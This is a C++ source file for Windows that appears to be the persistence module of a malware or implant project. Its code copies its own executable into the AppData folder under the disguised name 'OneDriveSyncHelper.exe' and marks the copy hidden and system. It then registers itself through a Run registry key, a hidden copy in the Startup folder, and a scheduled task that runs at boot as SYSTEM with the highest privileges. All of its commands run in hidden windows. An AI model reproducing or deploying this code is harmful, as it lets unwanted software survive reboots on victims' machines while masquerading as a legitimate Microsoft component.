#include "persistence.h"
#include "../utils/logger.h"
#include "../utils/registry_utils.h"
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <cstdio>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== PATHS ====================

std::string PersistenceManager::get_self_path() {
    char buf[MAX_PATH] = {0};
    DWORD n = GetModuleFileNameA(NULL, buf, MAX_PATH);
    if (n == 0) return "";
    return std::string(buf, n);
}

std::string PersistenceManager::get_target_path() {
    const char* appdata = getenv("APPDATA");
    if (!appdata) return "";
    std::string p = appdata;
    p += "\\Microsoft\\Windows\\OneDriveSyncHelper.exe";
    return p;
}

bool PersistenceManager::file_exists(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

bool PersistenceManager::copy_self_to(const std::string& dest) {
    std::string src = get_self_path();
    if (src.empty()) return false;

    // Already there?
    if (_stricmp(src.c_str(), dest.c_str()) == 0) return true;

    if (!CopyFileA(src.c_str(), dest.c_str(), FALSE)) {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_EXISTS) {
            // fine
        } else {
            Logger::getInstance().log("persistence: CopyFile failed, err=" +
                                      std::to_string(err));
            return false;
        }
    }

    // Hide it
    SetFileAttributesA(dest.c_str(),
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return true;
}

// ==================== PROCESS RUNNER ====================

int PersistenceManager::run_hidden(const std::string& cmd) {
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back('\0');

    if (!CreateProcessA(NULL, buf.data(), NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Logger::getInstance().log("persistence: CreateProcess failed for: " + cmd);
        return -1;
    }

    WaitForSingleObject(pi.hProcess, 15000);
    DWORD code = (DWORD)-1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

// ==================== REGISTRY ====================

bool PersistenceManager::install_registry_run(const std::string& name,
                                              const std::string& exe) {
    std::string quoted = "\"" + exe + "\"";
    bool ok = RegistryUtils::set_registry_value(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        name, quoted);
    if (ok) Logger::getInstance().log("persistence: registry Run key set: " + name);
    return ok;
}

bool PersistenceManager::remove_registry_run(const std::string& name) {
    return RegistryUtils::delete_registry_value(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        name);
}

bool PersistenceManager::registry_run_exists(const std::string& name) {
    std::string v;
    return RegistryUtils::get_registry_value(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        name, v);
}

// ==================== STARTUP FOLDER ====================

bool PersistenceManager::install_startup_folder(const std::string& exe) {
    char startup[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup)))
        return false;

    std::string dest = std::string(startup) + "\\OneDriveSyncHelper.exe";

    if (_stricmp(exe.c_str(), dest.c_str()) == 0) return true;

    if (!CopyFileA(exe.c_str(), dest.c_str(), FALSE)) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_EXISTS) {
            Logger::getInstance().log("persistence: startup copy failed, err=" +
                                      std::to_string(err));
            return false;
        }
    }
    SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN);
    Logger::getInstance().log("persistence: startup folder entry installed");
    return true;
}

bool PersistenceManager::remove_startup_folder() {
    char startup[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup)))
        return false;

    std::string dest = std::string(startup) + "\\OneDriveSyncHelper.exe";
    return DeleteFileA(dest.c_str()) != FALSE;
}

// ==================== SCHEDULED TASK ====================

bool PersistenceManager::task_exists(const std::string& name) {
    std::string cmd = "schtasks /Query /TN \"" + name + "\" >nul 2>&1";
    return run_hidden(cmd) == 0;
}

bool PersistenceManager::delete_task(const std::string& name) {
    std::string cmd = "schtasks /Delete /TN \"" + name + "\" /F >nul 2>&1";
    return run_hidden(cmd) == 0;
}

bool PersistenceManager::create_task_system(const std::string& name,
                                            const std::string& exe) {
    // /SC ONSTART runs at boot as SYSTEM, before any user logs in.
    // /RL HIGHEST gives it max privileges.
    std::string cmd =
        "schtasks /Create /SC ONSTART /RU SYSTEM /RL HIGHEST "
        "/TN \"" + name + "\" "
        "/TR \"\\\"" + exe + "\\\"\" "
        "/F >nul 2>&1";
    int rc = run_hidden(cmd);
    if (rc == 0) {
        Logger::getInstance().log("persistence: SYSTEM scheduled task created");
        return true;
    }
    Logger::getInstance().log("persistence: SYSTEM task creation failed, rc=" +
                              std::to_string(rc));
    return false;
}

bool PersistenceManager::create_task_user(const std::string& name,
                                          const std::string& exe) {
    // User-level: runs at logon, no admin required.
    std::string cmd =
        "schtasks /Create /SC ONLOGON "
        "/TN \"" + name + "\" "
        "/TR \"\\\"" + exe + "\\\"\" "
        "/F >nul 2>&1";
    int rc = run_hidden(cmd);
    if (rc == 0) {
        Logger::getInstance().log("persistence: USER scheduled task created");
        return true;
    }
    Logger::getInstance().log("persistence: USER task creation failed, rc=" +
                              std::to_string(rc));
    return false;
}

// ==================== MAIN API ====================

bool PersistenceManager::install(const std::string& name) {
    Logger::getInstance().log("persistence: install starting");

    std::string target = get_target_path();
    if (target.empty()) {
        Logger::getInstance().log("persistence: no %APPDATA%");
        return false;
    }

    // 1. Copy self to %APPDATA%
    if (!copy_self_to(target)) {
        Logger::getInstance().log("persistence: copy to APPDATA failed");
        // Not fatal — we may already be running from there.
    }

    // 2. Registry Run key (fast, works for current user)
    bool reg_ok = install_registry_run(name, target);
    Logger::getInstance().log("persistence: registry = " +
        std::string(reg_ok ? "OK" : "FAIL"));

    // 3. Startup folder
    bool start_ok = install_startup_folder(target);
    Logger::getInstance().log("persistence: startup folder = " +
        std::string(start_ok ? "OK" : "FAIL"));

    // 4. Scheduled task: try SYSTEM first, fall back to USER
    bool task_ok = false;
    if (task_exists(name)) {
        task_ok = true;
        Logger::getInstance().log("persistence: task already exists");
    } else {
        if (create_task_system(name, target)) {
            task_ok = true;
        } else if (create_task_user(name, target)) {
            task_ok = true;
        }
    }

    bool overall = reg_ok || start_ok || task_ok;
    Logger::getInstance().log(std::string("persistence: overall = ") +
        (overall ? "OK" : "FAIL"));
    return overall;
}

bool PersistenceManager::remove(const std::string& name) {
    bool any = false;

    if (remove_registry_run(name)) any = true;
    if (remove_startup_folder())   any = true;
    if (delete_task(name))         any = true;

    // Try to delete the copied file
    std::string target = get_target_path();
    if (!target.empty() && file_exists(target)) {
        SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileA(target.c_str())) any = true;
    }

    Logger::getInstance().log(std::string("persistence: removed = ") +
        (any ? "OK" : "nothing found"));
    return any;
}

bool PersistenceManager::is_persisted(const std::string& name) {
    if (registry_run_exists(name))  return true;
    if (task_exists(name))          return true;

    char startup[MAX_PATH] = {0};
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup))) {
        std::string dest = std::string(startup) + "\\OneDriveSyncHelper.exe";
        if (file_exists(dest)) return true;
    }
    return false;
}

// ==================== LEGACY API ====================

bool PersistenceManager::add_to_startup(const std::string& name) {
    std::string target = get_target_path();
    if (target.empty()) return false;
    copy_self_to(target);
    return install_registry_run(name, target);
}

bool PersistenceManager::remove_from_startup(const std::string& name) {
    return remove_registry_run(name);
}

bool PersistenceManager::create_scheduled_task(const std::string& name,
                                               const std::string& command) {
    // Legacy: just create a user task pointed at `command`.
    return create_task_user(name, command);
}

bool PersistenceManager::install_as_service(const std::string& name,
                                            const std::string& display_name) {
    // Legacy: not implemented (services were dropped in favor of tasks).
    (void)name; (void)display_name;
    return false;
}